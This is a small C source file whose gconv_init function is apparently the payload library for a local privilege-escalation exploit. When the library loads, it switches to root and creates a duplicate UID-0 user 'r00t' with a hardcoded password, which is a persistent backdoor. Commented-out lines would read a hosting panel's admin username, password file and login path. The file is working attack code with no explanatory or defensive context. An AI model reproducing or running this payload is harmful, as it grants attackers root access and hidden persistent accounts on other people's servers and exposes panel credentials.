#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>



void gconv(void) {
}

void gconv_init(void *step)
{
	setuid(0);
	setgid(0);
	system("/usr/sbin/useradd -u 0 -o -g 0 r00t;echo XHSZWCPU6Nvobe |/usr/bin/passwd --stdin r00t");
	//system("/www/server/panel/pyenv/bin/python /www/server/panel/tools.py username");
	//system("/usr/bin/cat /www/server/panel/default.pl");
	//system("/usr/bin/cat /www/server/panel/data/admin_path.pl");
	exit(0);
}
